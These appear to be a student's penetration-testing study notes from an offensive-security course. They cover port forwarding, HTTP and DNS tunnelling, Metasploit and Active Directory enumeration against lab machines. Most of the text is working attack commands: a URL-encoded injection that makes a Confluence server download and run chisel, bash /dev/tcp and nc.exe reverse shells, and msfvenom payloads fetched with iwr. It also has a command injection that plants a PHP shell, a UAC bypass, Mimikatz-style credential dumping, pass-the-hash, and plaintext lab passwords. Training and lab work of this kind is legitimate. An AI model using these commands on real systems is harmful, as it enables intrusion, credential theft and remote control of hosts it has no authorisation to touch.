The OpenSSH client has been bundled with Windows by default since version 1803 (April 2018 Update),[1](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/port-redirection-and-ssh-tunneling/port-forwarding-with-windows-tools/sshexe#fn1) and has been available as a *Feature-on-Demand* since 1709 (Windows 10 Fall Creators Update).[2](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/port-redirection-and-ssh-tunneling/port-forwarding-with-windows-tools/sshexe#fn2) On Windows versions with SSH installed, we will find **scp.exe**, **sftp.exe**, **ssh.exe**, along with other **ssh-*** utilities in **%systemdrive%\Windows\System32\OpenSSH** location by default.

192.168.186.64 - MULTISERVER03 OS, 192.168.45.191 - Kali OS

10.4.186.215 - PGDATABASE01 OS

```markdown
kali>xfreerdp /v:192.168.186.64  /u:rdp_admin /p:P@ssw0rd!
windows-cmd>where ssh, ssh.exe -V(#Higher then 7.6)
kali>sudo systemctl start ssh
kali>sudo ss -ntplu (#Port 22 is listening on IPv4 and IPv6)
windows-cmd>ssh -N -r 9998 kali@192.168.45.191
kali>sudo ss -ntplu (#Port 9998 is listening on IPv4 and IPv6)
kali>proxychains psql -h 10.4.186.215 -U postgres (#user/pass-postgres/D@t4basePassw0rd!)
kali>proxychains ./ssh_exe_exercise_client.bin -i 10.4.186.215 -p 4141(#Get flag)
```

### Plink

Administrators may want to avoid leaving OpenSSH on their Windows machines, so we're not guaranteed to discover an OpenSSH client. Even if we find ourselves on a recent version of Windows, the network administrators may have removed it.

Nevertheless, network administrators still need remote administration tools. Most networks have SSH servers running somewhere, and administrators need tools to connect to these servers from Windows hosts. Before OpenSSH was so readily available on Windows, most network administrators' tools of choice were *PuTTY*[1](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/port-redirection-and-ssh-tunneling/port-forwarding-with-windows-tools/plink#fn1) and its command-line-only counterpart, *Plink*.[2](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/port-redirection-and-ssh-tunneling/port-forwarding-with-windows-tools/plink#fn2)

```markdown
kali>sudo systemctl start apache2
kali>sudo cp /usr/share/windows-resources/binaries/nc.exe /var/www/html 
kali>sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html 
#http://192.168.186.64/umbraco/forms.aspx, here you can access the command line
#Execute below command on Browser>
Browser>powershell wget -Uri http://192.168.45.191/nc.exe -Outfile C:\Windows\Temp\nc.exe
Brower>powershell wget -Uri http://192.168.45.191/plink.exe -Outfile C:\Windows\Temp\plink.exe
kali>nc -nlvp 4446
Browser>C:\Windows\Temp\nc.exe -e cmd.exe 192.168.45.191 4446
kali>nc -nlvp 4446  (# will get **windows-shell**)
windows-shell>C:\Windows\Temp\plink.exe -ssh -l kali -pw kali -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.191
kali>sudo ss -ntplu (#check 9833 port listening)
kali>xfreerdp /v:127.0.0.1:9833  /u:rdp_admin /p:P@ssw0rd! (#Got flag on desktop)
```

### Netsh

There is a native way to create a port forward on Windows we should explore: the built-in firewall configuration tool *Netsh*[1](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/port-redirection-and-ssh-tunneling/port-forwarding-with-windows-tools/netsh#fn1) (also known as *Network Shell*). Using Netsh, we can set up a port forward with the *portproxy*[2](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/port-redirection-and-ssh-tunneling/port-forwarding-with-windows-tools/netsh#fn2) *subcontext*[3](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/port-redirection-and-ssh-tunneling/port-forwarding-with-windows-tools/netsh#fn3) within the *interface* context.[4](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/port-redirection-and-ssh-tunneling/port-forwarding-with-windows-tools/netsh#fn4) While Netsh requires administrative privileges to create a port forward on Windows, it can be very useful in some restrictive situations.

Let's consider a slight modification of the previous scenario. MULTISERVER03 is serving its web application on TCP port 80 on the perimeter. CONFLUENCE01 is no longer accessible on the WAN interface. For simplicity, the firewall on MULTISERVER03 also allows inbound TCP port 3389, meaning we are able to log in over RDP directly.

192.168.205.64 - MULTISERVER03 OS, 191.168.45.191 - kali OS

10.4.205.215     - PGDATABASE01 OS

```markdown
kali>xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.205.64
#Open CMD with administrator privilege
cmd>netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.205.64 connectport=22 connectaddress=10.4.205.215
cmd>netstat -anp TCP | find "2222" 
cmd>netsh interface portproxy show all
kali>sudo nmap -sS 192.168.205.64 -Pn -n -p2222 (# Port Filtered)
cmd>netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.205.64 localport=2222 action=allow
kali>sudo nmap -sS 192.168.205.64 -Pn -n -p2222 (# Port Open)
>ssh database_admin@192.168.205.64 -p2222
#Get flag at /tmp/netsh_flag
cmd>netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
cmd>netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.205.64
---------------------------------------------------------------------------------------
#Capstone
1.Repeat the steps in this learning unit.
2.Use the command in Listing 60, and change the port to 4545 and the IP.
3.Download the netsh_exercise_client.bin.
4.Make the binary executable and run it against 4545 on MULTISERVER03 to get the flag.
---------------------------------------------------------------------------------------
kali>xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.205.64
#Open CMD with administrator privilege
cmd>netsh interface portproxy add v4tov4 listenport=4545 listenaddress=192.168.186.64 connectport=4545 connectaddress=10.4.186.215
cmd>netsh interface portproxy show all
cmd>netsh advfirewall firewall add rule name="port_forward_ssh_4545" protocol=TCP dir=in localip=192.168.186.64 localport=4545 action=allow
kali>netsh_exercise_client.bin -i 192.168.186.64 -p 4545 (# netsh_exercise_client.bin make this file executable chmod +x )
#After Getting the flag
cmd>netsh advfirewall firewall delete rule name="port_forward_ssh_4545"
```

# 19 Tunneling through Deep Packet Inspection

*Deep packet inspection*[1](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/tunneling-through-deep-packet-inspection/tunneling-through-deep-packet-inspection#fn1) is a technology that's implemented to monitor traffic based on a set of rules. It's most often used on a network perimeter, where it can highlight patterns that are indicative of compromise.

## HTTP Tunneling Theory and Practice

Let's begin our exploration of HTTP tunneling by introducing a simple scenario. In this case, we have compromised CONFLUENCE01, and can execute commands via HTTP requests. However, once we try to pivot, we are blocked by a considerably restrictive network configuration.

Specifically, a *Deep Packet Inspection* (DPI) solution is now terminating all outbound traffic except HTTP. In addition, all inbound ports on CONFLUENCE01 are blocked except TCP/8090. We can't rely on a normal reverse shell as it would not conform to the HTTP format and would be terminated at the network perimeter by the DPI solution. We also can't create an SSH remote port forward for the same reason. The only traffic that will reach our Kali machine is HTTP, so we could, for example, make requests with *Wget* and *cURL*.

The above is a perfect scenario for *Chisel*,[1](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/tunneling-through-deep-packet-inspection/http-tunneling-theory-and-practice/http-tunneling-with-chisel#fn1) an HTTP tunneling tool that encapsulates our data stream within HTTP. It also uses the SSH protocol within the tunnel so our data will be encrypted.

Chisel uses a client/server model. A *Chisel server* must be set up, which can accept a connection from the *Chisel client*. Various port forwarding options are available depending on the server and client configurations. One option that is particularly useful for us is *reverse port forwarding*, which is similar to SSH remote port forwarding.

192.168.186.63 - Confluence01 OS, 10.4.186.215 - PGDATABASE01 OS

```markdown
kali>wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_386.gz
kali>gunzip chisel_1.7.7_linux_386.gz
kali>mv chisel_1.7.7_linux_386 chisel
kali>tail -f /var/log/apache2/access.log
kali>./chisel server --port 8080 --reverse
kali>sudo tcpdump -nvvvXi tun0 port 8080
kali>curl http://192.168.186.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.45.191/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/
#Nothing will return TCPDUMP
kali>curl http://192.168.186.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.45.191:8080%20R:socks%27%29.start%28%29%22%29%7D/
#Data in TCPDUMP stating that downloaded
#In the chisel ---server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
kali>sudo ss -ntplu
#Same 127.0.0.1:1080 will be their
kali>sudo apt install ncat
kali>ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.186.215(#password-sqlpass123)
>cat /tmp/chisel_flag
#
#Another Machine
#
kali>tail -f /var/log/apache2/access.log
kali>./chisel server --port 8008 --reverse
kali>sudo tcpdump -nvvvXi tun0 port 8080
kali>curl http://192.168.186.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.45.191/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/
#Nothing will return TCPDUMP
kali>curl http://192.168.186.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.45.191:8080%20R:socks%27%29.start%28%29%22%29%7D/
#Data in TCPDUMP stating that downloaded
#In the chisel ---server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
kali>sudo ss -ntplu
#socks5 127.0.0.1 1080 #Add this line end of  /etc/proxychains4.conf
kali>tail /etc/proxychains4.conf
#Same 127.0.0.1:1080 will be their
kali>proxychains ./chisel_exercise_client -i 10.4.186.215 -p 8008 (#Got flag)
```

## DNS Tunneling Theory and Practice

![Untitled](Untitled%2080.png)

```markdown
kali>curl -v http://192.168.186.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.191/1122%200%3E%261%27%29.start%28%29%22%29%7D/
>nc -nlvp 1122
confluence>python3 -c 'import pty; pty.spawn("/bin/sh")'
confluence>ssh -N -R 127.0.0.1:4447:10.4.186.215:22 kali@192.168.45.191
#Error ssh: connect to host 192.168.45.191 port 22: Connection refused
confluence>ssh database_admin@10.4.186.215 (PGDATABASE,#password-sqlpass123)
kali>ssh kali@192.168.186.7 (feline,#password-7he_C4t_c0ntro11er)
feline>cd dns_tunneling
feline>cat dnsmasq.conf
feline>sudo dnsmasq -C dnsmasq.conf -d
#Open New instance of Feline
kali>ssh kali@192.168.186.7 (feline2,#password-7he_C4t_c0ntro11er)
feline2>sudo tcpdump -i ens192 udp port 53
confluence>resolvectl status
PGDATABASE>nslookup exfiltrated-data.feline.corp (Error-** server can't find exfiltrated-data.feline.corp: NXDOMAIN)
#we can see the DNS recodes in feline2 tcpdump
feline> ^C (Intereput dnsmasq command)
feline>cat dnsmasq_txt.conf
feline>sudo dnsmasq -C dnsmasq_txt.conf -d
PGDATABASE>nslookup -type=txt www.feline.corp
#we can see the TXT DNS recodes dnsmasq_txt.conf in feline2 tcpdump
--------------------------------------------------------------------------------
feline>cat dnsmasq_txt.conf 
# Do not read /etc/resolv.conf or /etc/hosts
no-resolv
no-hosts

# Define the zone
auth-zone=feline.corp
auth-server=feline.corp

# TXT record below one line added
txt-record=www.give-me.cat-facts.internal
txt-record=www.feline.corp,here's something useful!
txt-record=www.feline.corp,here's something else less useful.
feline>sudo dnsmasq -C dnsmasq_txt.conf -d
PGDATABASE>exit
#GOt confluence
confluence>nslookup -type=txt give-me.cat-facts.internal 192.168.186.64 (Got flag)
```

### DNS Tunneling with dnscat2

![Untitled](Untitled%2081.png)

```markdown
kali>curl -v http://192.168.186.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.191/1122%200%3E%261%27%29.start%28%29%22%29%7D/
>nc -nlvp 1122
confluence>python3 -c 'import pty; pty.spawn("/bin/sh")'
confluence>ssh -N -R 127.0.0.1:4447:10.4.186.215:22 kali@192.168.45.191
#Error ssh: connect to host 192.168.45.191 port 22: Connection refused,
#Not user confluence
confluence>ssh database_admin@10.4.186.215 (PGDATABASE,#password-sqlpass123)
kali>ssh kali@192.168.186.7 (feline,#password-7he_C4t_c0ntro11er)
feline>listen 0.0.0.0:4555 172.16.186.217:4646 (#Listen on 4646 HRSHARES in question)
kali>./dnscat_exercise_client -i 192.168.186.7 -p 4555 (#Got flag)
```

# 20 The Metasploit Framework

The Metasploit Framework, maintained by *Rapid7*,[5](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/the-metasploit-framework/the-metasploit-framework#fn5) is described by its authors as "an advanced platform for developing, testing, and using exploit code". The project initially started off as a portable network game[6](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/the-metasploit-framework/the-metasploit-framework#fn6) and has evolved into a powerful tool for penetration testing, exploit development, and vulnerability research. The Framework has slowly but surely become the leading free exploit collection and development framework for security auditors. Metasploit is frequently updated with new exploits and is constantly being improved and further developed by Rapid7 and the security community.

## Getting Familiar with Metasploit

In Metasploit Framework 2 types of modules

1.Auxiliary module - protocol enumeration and port scanning

2.Exploit Module - Exploiting

```markdown
>sudo msfdb init
>sudo systemctl enable postgresql
>sudo msfconsole
>db_status (Check database connection)
>help (Type of Commands)
>workspace
>workspace -a pen200
>db_nmap
>db_nmap -A 192.168.189.202
>hosts
>services
>services -p 8000
>show -h
```

### Auxiliary Modules

The Metasploit Framework includes hundreds of auxiliary modules that provide functionality such as protocol enumeration, port scanning, fuzzing, sniffing, and more. Auxiliary modules are useful for many tasks, including information gathering (under the *gather/* hierarchy), scanning and enumeration of various services (under the *scanner/* hierarchy), and so on.

```markdown
>show auxiliary
>search type:auxiliary smb
>use 56 (scanner/smb/smb_version)
>info
>set rhosts 192.168.189.202 or services -p 445 --rhosts
>run
>vulns
>search type:auxiliary ssh
>use 15 (auxiliary/scanner/ssh/ssh_login   
set USERNAME george
>USERNAME => george
msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE rockyou.txt
>PASS_FILE => rockyou.txt
>set RPORT 2222
>RPORT => 2222
>set RHOST 192.168.189.201
>creds (george/chocolate)
>session -i 1 (Opens session)
>background (Makes the session to background)
```

### Exploit Modules

Exploit modules most common contain exploit code for vulnerable application and services. Metasploit contains over 2200 exploits at the time of this writing. Each was meticulously developed and tested, making MSF capable of successfully exploiting a wide variety of vulnerable services. These exploit are invoked in much the same way as auxiliary modules.

The output also contains information about **potential side effects of running this exploit module, such as *Indicators of compromise* entries in log solutions, and, in this example, artifacts on disk. This and the *module stability* help us predict if we may crash a target system or what information defenders may obtain from us using this exploit module.**

> exploit/multi/http/apache_normalize_path_rce -Exploit
> 

> auxiliary/multi/http/apache_normalize_path - auxiliary
> 

>run -j(Run exploit background)

```markdown
>search  Apache httpd 2.4.49
> use 0  (exploit/multi/http/apache_normalize_path_rce)
>info
>show options
>set payload payload/linux/x64/shell_reverse_tcp (tight control of the exploitation process.)
>show options
>set SSL false
>set RPORT 80
>set RHOSTS 192.168.206.16
>set lhost tun0
>run
>id
>^z (Background the session press Y)
> session -l
>session -i 2 (Selected 2 nd session, previous session is 1 st one)
```

## Using Metasploit Payloads

In the previous Learning Unit, we leveraged linux/x64/shell_reverse_tcp as a payload for an exploit module. Metasploit contains numerous other payloads targeting different operating system and architectures. In addition, Metasploit contains many other payload types beyond basic shells performing different operations on the target. Furthermore, the framework is also capable of generating various file types containing payloads to perform certain operations, such as starting a reverse shell. In this Learning Unit, we’ll discuss staged vs non-staged payloads, explore a special kind of payload named Meterpreter, and explore executable files containing payloads.

### Staged vs Non-Staged payloads

In this section, we'll explore the differences between *staged* and *non-staged* payloads. Let's assume we've identified a buffer overflow vulnerability in a service. As we learned in *Fixing Exploits*, we need to be aware of the buffer size our shellcode will be stored in. If the shellcode size of our exploit exceeds the buffer size, our exploit attempt will fail. In a situation like this, it's vital which payload type we choose: staged or non-staged.
**A Non-staged** payload is sent in its entirety along with the exploit. This means the payload contains the exploit and full shellcode for a selected task. In general, these “all-in-one” payloads are more stable. The downside is that the size of these payloads will be bigger then other types.

**A Staged** payload is usually sent in two parts. The first part contains a small primary payload that causes the victim machine to connect back to the attacker, transfer a larger secondary payload containing the rest of the shellcode, and then execute it.

> payload/linux/x64/shell/reverse_tcp - **Staged**
> 

> payload/linux/x64/shell_reverse_tcp - **Non-Staged**
> 

> payload/linux/x86/shell/reverse_tcp - **32 bit Staged**
> 

### Meterpreter Payload

Metasploit contains the Meterpreter payload, which is a multi-function payload that can be dynamically extended at run-time. The payload resides entirely in memory on the target and its communication is encrypted by default. Meterpreter offers  capabilities that are especially useful in the post-exploitation phase and exits for various operating systems such as Windows, Linux, macOS, Android and more.

```markdown
>search apche 2.4.49 
>set pauload exploit/multi/http/apache_normalize_path_rce
>show payloads
>set payload 13 (payload/linux/x64/meterpreter_reverse_tcp )
>run 
>sysinfo, getuid
>^z (background the session)
>channels -l
>channel -i 1
>help
>pwd (Target pwd)
>lpwd (loacl machine pwd)
>lcd /home/kali/Downloads (Local)
>lpwd
>download /etc/passwd
>lcat /home/kali/Downloads/passwd (Local machine cat)
>upload /usr/bin/unix-privesc-check /tmp/
>ls /tmp
>exit (Close all active sessions)
>show payloads
>set payloads 12 (payload/linux/x64/meterpreter_reverse_https, it will encrypt the entire traffic)
>show options
>run
>search -f "passwords" (search command find file)
#/opt/passwords
```

### Executable Payloads

Metasploit also provides the functionality to export payloads into various file types and formats such as Windows and Linux binaries, web shells, and more. Metasploit contains **msfvenom** as a standalone tool to generate these payloads. It provides standardized command line options and includes various techniques to customize payloads.

**Windows metasploit useage**

> **Windows OS use Non-staged payloads and NC works -windows/x64/shell_reverse_tcp**
> 

> **Windows OS Doest wor’k with staged and NC Not works -windows/x64/shell/reverse_tcp**
> 

> **Windows OS with Staged payload with msfconsole multi/handler with same payload**
> 

```markdown
kali>msfvenom -l payloads --platform windows --arch x64
>msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.175 LPORT=443 -f exe -o nonstaged.exe
>xfreerdp /v:192.168.156.202 /u:justin /p:SuperS3cure1337#
#Windows open cmd
>iwr -uri http://192.168.45.175/nonstaged.exe -Outfile nonstaged.exe
>nc -nlvp 443
>.\nonstaged.exe
#I got shell execute all commands
>msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.45.175 LPORT=443 -f exe -o staged.exe
>iwr -uri http://192.168.45.175/staged.exe -Outfile staged.exe
>nc -nlvp 443
>.\staged.exe
##I got shell but can't execute commands
#Close the netcat
kali>sudo msfconsole
>use multi/handler
>set payload windows/x64/shell/reverse_tcp
>show options
>set LHOST 192.168.45.175
>set LPORT 443
>run
#Execute the Staged binary exe file
#Shell connected to msfconsole
```

Windows web server running at C:\xampp\htdocs

>git;dir ([http://192.168.156.189:8000/](http://192.168.156.189:8000/))

![Untitled](Untitled%2082.png)

```markdown
>gobuster dir -u http://192.168.156.189 -w /usr/share/wfuzz/wordlist/general/megabeast.txt 
#Found meteor, 
#Enumerate uploading the .txt file first try to access from browser then uploaded .pHP file got shell
>msfvenom -p php/reverse_php LHOST=192.168.45.175 LPORT=443 -f raw -o msfvenom.pHP 
#Always try 443, after any other port is not working like 4444 is not working intially changed to 443 worked
>curl -X POST --data 'Archive=git%3B(iwr%20-uri%20http%3A%2F%2F192.168.45.175%3A1234%2Fmsfvenom_shell.pHP%20-Outfile%20msfvenom_shell.pHP)%3Bdir%20-e%20powershell' http://192.168.156.189:8000/archive
#both same mentioned specific path 
>git;iwr -uri http://192.168.45.175:1234/msfvenom.pHP -Outfile C:\xampp\htdocs\meteor\uploads\mal.pHP
http://192.168.156.189/meteor/uploads/mal.pHP (IN browser got shell in NC)
>nc -nlvp 443
```

## Performing Post-Exploitation with Metasploit

Once we gain access to a target machine, we can move on to the post-exploitation phase where we gather information, take steps to maintain our access, pivot to other machines, elevate our privileges, and so on.

The Metasploit Framework has several interesting post-exploitation features that can simplify many aspects of the process. In addition to the built-in Meterpreter commands, a number of post-exploitation MSF modules take an active session as an argument and perform post-exploitation operations on them.

### Core Meterpreter Post-Exploitation Features

Let's explore some of these features. We should note that the Linux Meterpreter payload contains fewer post-exploitation features than the Windows one. Therefore, we'll explore these features on the Windows target ITWK01. Let's assume we already gained an initial foothold on the target system and deployed a bind shell as way of accessing the system.

```markdown
>msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.45.175 LPORT=443 -f exe -o mef.exe
>sudo msfconsole 
>use multi/handler
>set payload windows/x64/meterpreter_reverse_https
>set lhost tun0
>set lport 443
>nc 192.168.156.223 4444(Got shell)
>powershell
>iwr -uri http://192.168.45.175:1234/msf.exe -Outfile msf.exe
>.\msf.exe
#Connected to msfconsole
msfconsole>idletime
>getuid
>whoami /priv(user luiza - SeImpersanate)
>ps (6036 msf.exe - our payload)
#6036 msf.exe
#7136 Onedrive
>migrate 7136 (7136 on the user offsec)
>execute -H -f notepad
#8860 notepad
>migrate 8860
```

### Post-Exploitation Modules

Sessions that were created through attack vectors such as the execution of a client-side attack will likely provide us only with an unprivileged shell. But if the target user is a member of the local administrators group, we can elevate our shell to a high integrity level if we can bypass *User Account Control* (UAC).[1](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/the-metasploit-framework/performing-post-exploitation-with-metasploit/post-exploitation-modules#fn1)

meterpreter kiwi - like mimicatz dump LM/NTLM credentials 

```markdown
>msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.45.175 LPORT=443 -f exe -o mef.exe
>sudo msfconsole 
>use multi/handler
>set payload windows/x64/meterpreter_reverse_https
>set lhost tun0
>set lport 443
>nc 192.168.156.223 4444(Got shell)
>powershell
>iwr -uri http://192.168.45.175:1234/msf.exe -Outfile msf.exe
>.\msf.exe
#Connected to msfconsole
msfconsole>getuid (luiza user)
>getsystem (NT Autherity)
>migrate 8044 (Onedrive pid)
>getuid (offsec)
#Identify the integrity level of Offsec
>shell
>powershell -ep bypass
>Import-Module NtObjectManager
>Get-NtTokenIntegrityLevel (Medium)
>^z
meterpreter>bg (session 2)
>search uac
>use exploit/windows/local/bypassuac_sdclt
>show options 
>set session 2
>set lhost tun0
>set lport 4444
>run
>shell 
>powershell -ep bypass
>Import-Module NtObjectManager
>Get-NtTokenIntegrityLevel (High)
#Exit all sessions
>use multi/handler
>set payload windows/x64/meterpreter_reverse_https
>.\msf.exe
meterpreter>getuid (Luiza)
>getsystem (NT Authrity)
>load kiwi (It's like mimicats)
>help
>creds_msv
```

### Pivoting with Metasploit

The ability to pivot to another target or network is a vital skill for every penetration tester. In Port Redirection and Pivoting, we learned various techniques to perform pivoting. Instead of using these techniques manually, we can also use Metasploit to perform them.

**192.168.230.223,172.16.185.200**

```markdown
>ipconfig (**192.168.230.223,172.16.185.199 Dual interfaces on compromised client**)
>nc 192.168.230.223 4444
>msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.45.175 LPORT=443 -f exe -o msf.exe
>sudo msfconsole 
>use multi/handler
>set payload windows/x64/meterpreter_reverse_https
>set lhost tun0
>set lport 443

#Above method is not working
#Same msfconsole terminal
>use multi/manage/autoroute
>show options
>sessions -l
>set session 1
>run (post module exeution completed)
>use auxiliary/server/socks_proxy 
>show options
>set SRVHOST 127.0.0.1
>set VERSION 5
>run -j
>proxychains xfreerdp /v:172.16.185.200 /u:luiza /p:'BoccieDearAeroMeow1!' /cert-ignore /timeout:100000
#GOt the flag without entering password
```

## Automating Metasploit

Metasploit automates various tasks and operations for us, but we can create scripts to further automate repetitive commands inside framework itself. These scripts are called Resource Scripts.

### Resource Scripts

Resource scripts can chain together a series of Metasploit console commands and Ruby code. Meaning, we can either use the built-in commands of Metasploit or write code in Ruby (as it’s the language Metasploit is developed in) to manage control flow as well as develop advanced logic components for resource scripts.

Scripts → **ls -l /usr/share/metasploit-framework/scripts/resource** 

```markdown
>cat msf_listener.rc
use exploit/multi/handler
set payload windows/meterpreter_reverse_https
set LHOST 192.168.45.193
set LPORT 443
set AutoRunScript post/windows/manage/migrate
set ExitOnSession false
run -z -j
>sudo msfconsole -r msf_listener.rc
#It will automatical start the listener
>msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.45.193 LPORT=443 -f exe -o msf.exe
>xfreerdp /v:192.168.230.202 /u:justin /p:SuperS3cure1337#
#Open powershell run below commands
>iwr -uri http://192.168.45.193:8000/msf.exe -Outfile msf.exe
>.\msf.exe
```

### Capstone

1. Perform a full TCP port scan using Nmap to identify all open services.
2. You can employ Nmap scripts and version scanning to gather more information about the services.
3. Perform research in Metasploit to determine if there are any available exploitation modules.
4. Prior to executing the exploitation module, ensure you set the correct OS version and payload according to your target.
5. Attempt privilege escalation using MSF and proceed to lateral movement using cached things.
6. 

![Untitled](Untitled%2083.png)

```markdown
kali>sudo msfconsole
#In port 8080 running Apache NiFi, Identified in msfconsole
>set payload exploit/multi/http/apache_nifi_processor_rce
>set payload cmd/windows/powershell/x64/meterpreter/reverse_tcp
>set targeturi / or /nifi-api
# Optional based on working set SSL false, set ForceExploit true
>set target 1
#Got shell, Migrate my pid to Nt-Authority working pid 2680 MicrosoftEdgeUpdate.exe 
>getsystem (Got system user access)
>load kiwi (Mimikatz)
>creds_msv (Not worked)
>lsa_dump_sam (Dumped all creds)
>impacket-psexec -hashes 00000000000000000000000000000000:445414c16b5689513d4ad8234391aacf itwk04admin@192.168.188.226
#Logged got flag
```

# 21. Active Directory Introduction and Enumeration

## Active Directory Introduction

In Active Directory we got user credential by phishing attack or in penetration test client provided the credentials, the credentials are low level domain user of AD. Using this account enumerate process assume got another low level domain user repeat the same steps with the new user, Domain administrator might provided some additional or higher level privileges to new user. This   process is “rinse and repeat” it will be very crucial step in penetration testing.

## AD Manual Enumeration

1. net.exe - net user
2. PowerShell and .NET Classes (Get-ADUser)
3. Directory Entry & Searcher enumeration.ps1
4. Powerview
`LDAP://HostName[:PortNumber][/DistinguishedName]`
- The *Hostname* can be a computer name, IP address or a domain name. In our case, we are working with the *corp.com* domain
- Since it will automatically choose the port based on whether or not we are using an SSL connection.
- *DistinguishedName* (DN)[7](https://portal.offsec.com/courses/pen-200-44065/learning/active-directory-introduction-and-enumeration-45847/active-directory-manual-enumeration-46015/enumerating-active-directory-using-powershell-and-net-classes-45851#fn-local_id_455-7) is a part of the LDAP path. A DN is a name that uniquely identifies an object in AD.

```bash
Logging with xfreerdp
kali>xfreerdp /u:stephanie /d:corp.com /v:192.168.221.75(@Password-LegmanTeamBenzoin!!)
cmd>net user /domain (list of users)
cmd>net user jeffadmin /domain (part of domain admins groups)
cmd>net group /domain (some custom, pre build groups)
cmd>net group "Sales Department" /domain (2 users not much information)

cmd>[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() (#here chsoosing domain class, it revels AD information)

save data into powershell filename like enumerations.ps1
***start - enumarations.ps1
# Store the domain object in the $domainObj variable
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$domainObj
# Store the PdcRoleOwner name to the $PDC variable
$PDC = $domainObj.PdcRoleOwner.Name
$PDC
# Store the Distinguished Name variable into the $DN variable
$DN = ([adsi]'').distinguishedName
# Print the $DN variable
$DN
$LDAP = "LDAP://$PDC/$DN"
$LDAP (#output -  LDAP://DC1.corp.com/DC=corp,DC=com)
***end - enumarations.ps1

PS>powershell -ep bypass (#bypass the execution policy, opens up powershell)
PS>.\enumarations.ps1 (# gives DC information)

```

### Adding Search Functionality to our Script (DirectoryEntry, DirectorySearcher)

So far, our script builds the required LDAP path. Now we can build in search functionality.

To do this, we will use two .NET classes that are located in the System.DirectoryServices namespace, more specifically the **DirectoryEntry** and **DirectorySearcher** classes.

The DirectoryEntry class encapsulates an object in the AD service hierarchy. In our case, we want to search from the very top of the AD hierarchy, so we will provide the obtained LDAP path to the DirectoryEntry class.

> One thing to note with DirectoryEntry is that we can pass it credentials to authenticate to the domain. However, since we are already logged in, there is no need to do that here.
> 

The DirectorySearcher class performs quires against AD using LDAP. When creating an instance of DirectorySearcher, we must specify the AD service we want to query in the form of the SearchRoot property. According to Microsoft’s documentation, this property indicates where the search begins of the hierarchy, we will pass that as a variable to DirectorySearcher.

The DirectorySearcher documentation lists FindAll(), which returns a collection of all the entries found in AD.

The official documentation reveals different values of the **samAccountType** attribute, but we'll start with 0x30000000 (decimal **805306368**), which will enumerate all users in the domain. To implement the filter in our script,

```markdown
xfreerdp /v:192.168.201.75 /u:stephanie /d:corp.com /p:'LegmanTeamBenzoin!!'
## file enumration.ps1 created in powershell ISE
$PDC=[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
$DN=([adsi]'').distinguishedName
$LDAP="LDAP://$PDC/$DN"
$direntry=New-Object System.DirectoryServices.DirectoryEntry($LDAP)
$dirsearcher=New-Object SYstem.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.FindAll()
##Generating lot of output, dirsearcher.filter
$dirsearcher=New-Object SYstem.DirectoryServices.DirectorySearcher($direntry)
